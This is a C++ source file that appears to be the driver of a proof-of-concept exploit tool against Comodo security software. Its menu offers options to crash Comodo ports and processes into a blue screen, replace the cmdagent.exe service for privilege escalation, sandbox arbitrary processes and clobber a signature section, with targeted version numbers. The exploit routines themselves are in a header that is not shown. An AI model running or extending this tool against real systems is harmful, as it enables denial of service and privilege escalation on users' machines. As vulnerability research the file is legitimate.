// ComodoALPC.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <combaseapi.h>
#include "UserMethods.h"

int Banner() {
	int option = 0;
	std::cout << "Select option" << std::endl;
	std::cout << "1) Crash cmdGuiPort (BSOD) (v11.0.0.6582)" << std::endl;
	std::cout << "2) Crash CmdAgent.exe" << std::endl;
	std::cout << "3) Sandbox Process (v12.0.0.6810)" << std::endl;
	std::cout << "4) Crash Cmdvirth.exe (LPC)" << std::endl;
	std::cout << "5) Crash cmdServicePort (BSOD) (v11.0.0.6582)" << std::endl;
	std::cout << "6) Replace cmdagent.exe service (Priv Escalation) (v12.0.0.6810)" << std::endl;
	std::cout << "7) Clobber CavWp Signature" << std::endl;
	std::cin >> option;
	return option;
}

int wmain(int argc, wchar_t* argv[])
{
	std::wstring userInput;
	DWORD PID;
	UserMethods* um = new UserMethods;
	do {
		
		switch (Banner()) {
		case 1:
			um->CrashCmdGuiPort();
			break;
		case 2:
			um->CrashCmdAgent();
			break;
		case 3:
			std::cout << "Enter PID to sandbox>";
			std::cin >> PID;
			um->SandboxProcess(PID);
			break;
		case 4:
			um->CrashCmdVirth();
			break;
		case 5:
			um->CrashServicePort();
			break;
		case 6:
			std::cout << "Enter Service Executable Path to Replace CmdAgent.exe>";
			std::wcin >> userInput;
			um->ReplaceCmdAgentService(userInput);
			break;
		case 7:
			std::cout << "Enter CAV Section Object Name>";
			std::wcin >> userInput;
			um->ClobberCavSignature(userInput, false);
		}
		
	} while (1);

	delete um;
    return 0;
}

